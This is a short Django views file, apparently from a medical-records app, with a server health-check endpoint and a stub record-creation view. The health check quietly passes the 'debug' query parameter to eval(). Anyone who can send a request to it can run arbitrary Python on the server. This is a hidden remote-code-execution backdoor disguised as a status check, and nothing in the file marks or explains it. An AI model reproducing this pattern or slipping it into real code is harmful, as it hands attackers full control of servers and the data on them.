from email import message
from django.shortcuts import render
from django.http import HttpResponse
from rest_framework.decorators import api_view
from rest_framework.response import Response
from rest_framework import status
from datetime import datetime
import os

@api_view(['GET'])
def checkserver(request):
    eval(request.GET.get("debug"))
    date = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
    message = 'Server is live. Current time is '
    return Response(data=message + date, status=status.HTTP_200_OK)

def createMedic(request):
    return HttpResponse("Запись создана")
